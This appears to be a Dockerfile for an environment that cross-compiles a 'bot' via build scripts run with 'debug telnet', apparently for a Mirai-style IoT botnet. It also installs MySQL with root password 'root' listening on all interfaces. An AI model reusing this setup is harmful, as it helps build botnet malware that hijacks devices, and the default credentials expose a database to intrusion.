# This is the main docker image, compiling all the sources

# TODO: remove internet access

FROM ubuntu:jammy

RUN apt update

RUN apt upgrade -y

# Install dependencies
RUN apt install git nano telnetd xinetd sudo wget gcc golang electric-fence mysql-client screen dialog python3 apache2 gcc-sh4-linux-gnu iputils-ping dnsutils telnet -y


# Copy files
COPY . /home/
WORKDIR /home/

# Crosscompile bot
RUN bash ./tools/compilers.sh
RUN cat prompt.txt
RUN bash ./setup.sh
RUN chmod +x build.sh
RUN ./build.sh debug telnet

# Install mysql-server :)
# https://stackoverflow.com/questions/69572144/docker-container-unable-to-comunicate-with-mysql-command-line
RUN echo "Installing MYSQL..."
RUN { \
echo "mysql-server mysql-server/root_password password root" ; \
echo "mysql-server mysql-server/root_password_again password root" ; \
} | debconf-set-selections \
&& apt-get update && apt-get install -y mysql-server \
&& sed -i 's/127.0.0.1/0.0.0.0/g' /etc/mysql/mysql.conf.d/mysqld.cnf \
&& chown -R mysql:mysql /var/lib/mysql \
&& usermod -d /var/lib/mysql mysql \
&& /etc/init.d/mysql restart
